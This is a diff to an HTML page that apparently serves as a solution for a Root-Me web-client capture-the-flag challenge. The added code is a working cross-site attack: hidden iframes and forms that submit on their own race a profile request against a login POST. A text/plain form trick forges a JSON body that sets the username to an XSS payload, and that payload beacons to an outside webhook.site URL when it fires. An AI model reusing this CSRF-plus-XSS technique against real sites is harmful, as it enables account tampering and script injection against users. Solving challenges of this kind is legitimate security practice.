@@ -2,16 +2,51 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>JavaScript Test</title>
+    <title>Root-Me Race Test</title>
 </head>
 <body>
 
-<h1>JS Execution Test</h1>
+<iframe name="profileFrame" style="display:none"></iframe>
+<iframe name="loginFrame" style="display:none"></iframe>
+
+<form id="profileForm"
+      method="GET"
+      action="https://web-client-ch6.challenge01.root-me.org:58006/profile"
+      target="profileFrame">
+</form>
+
+<form id="loginForm"
+      method="POST"
+      enctype="text/plain"
+      action="https://web-client-ch6.challenge01.root-me.org:58006/login"
+      target="loginFrame">
+
+    <input type="hidden" id="payload">
+</form>
 
 <script>
-const hook = "https://webhook.site/e1570119-9fac-44ef-9e18-89981f7f7c07";
+const HOOK =
+"https://webhook.site/e1570119-9fac-44ef-9e18-89981f7f7c07";
 
-new Image().src = hook + "?stage=js-executed&time=" + Date.now();
+const xss =
+`<img src=x onerror="new Image().src='${HOOK}?stage=xss-fired'">`;
+
+const input = document.getElementById("payload");
+
+// Membentuk JSON melalui form text/plain
+input.name =
+    `{"username":${JSON.stringify(xss)},"secret":"x","ignore_me":"`;
+
+input.value = '"}';
+
+// Request pertama: ambil profil admin
+document.getElementById("profileForm").submit();
+
+// Request kedua: ubah username menjadi payload XSS
+setTimeout(() => {
+    document.getElementById("loginForm").submit();
+}, 60);
+
 </script>
 
 </body>
